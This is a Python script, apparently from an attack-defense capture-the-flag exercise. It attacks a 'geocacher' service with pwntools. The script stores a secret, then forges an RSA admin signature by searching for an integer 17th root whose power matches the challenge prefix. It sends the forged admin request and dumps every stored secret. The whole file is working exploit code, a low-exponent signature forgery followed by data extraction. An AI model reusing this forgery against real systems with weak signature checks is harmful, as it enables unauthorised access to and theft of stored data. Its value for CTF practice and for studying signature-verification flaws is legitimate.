import math
import os
import random
from client import DepositClient
from pwn import *
import geocacher_pb2

PORT = 5555

def bignum_to_bytes(n, rev=False):
    data = hex(n)[2:]
    data = "0" * (128 * 2 - len(data)) + data
    if rev:
        return bytes.fromhex(data)[::-1]
    else:
        return bytes.fromhex(data)

def create_session(host):
    client = DepositClient()

    conn = remote(host, PORT)
    conn.recvuntil('> ')
    conn.sendline(client.handshake())
    response = conn.recvuntil('> ', drop=True)
    conn.sendline(client.handshake_response(response))
    response = conn.recvuntil('> ', drop=True)

    return client, conn

def find_trivial_signature(start, e):
    min_n = int((start + b"\x00" * (127 - len(start))).hex(), 16)
    max_n = int((start + b"\xFF" * (127 - len(start))).hex(), 16)
    min_root = int(math.ceil(min_n ** (1 / e)))
    max_root = int(math.floor(max_n ** (1 / e)))
    start = start.hex()
    for root in range(min_root, max_root + 1):
        temp = hex(root ** e)[2:].rjust(127 * 2, "0")
        if temp.startswith(start):
            return root
    
    return None


def store_secret(host, flag):
    client, conn = create_session(host)
    location = client.pick_location(rce_flag=False)
    conn.sendline(client.store_secret(bytes(flag, "ascii"), location))
    conn.close()


def retrieve_secret(host, flag):
    client, conn = create_session(host)
    conn.sendline(client.list_busy_cells())
    challenge = client.parse_response(conn.recvuntil('> ', drop=True))
    full_challenge = client.session_key[:3] + challenge.data
    req = geocacher_pb2.AdminResponse()
    req.message_type = 13
    signature = find_trivial_signature(full_challenge, 17)
    if signature is None:
        print("Cannot find trivial signature")
        conn.close()
        return
    req.data = bignum_to_bytes(signature, True)
    conn.sendline(client.wrap_packet(req))
    results = client.parse_response(conn.recvuntil('> ', drop=True))
    for cell in results.cells:
        if str(cell.secret, "ascii") == flag:
            print("Successfully extracted the flag")
            conn.close()
            return True
    print("Didn't see the flag in results")
    print(flag, results)
    conn.close()
    return False


if __name__ == '__main__':
    flag = list(string.ascii_letters)
    random.shuffle(flag)
    flag = "".join(flag)
    store_secret(sys.argv[1], flag)
    for i in range(10):
        if retrieve_secret(sys.argv[1], flag):
            print("Took %d attempts in total" % (i + 1))
            break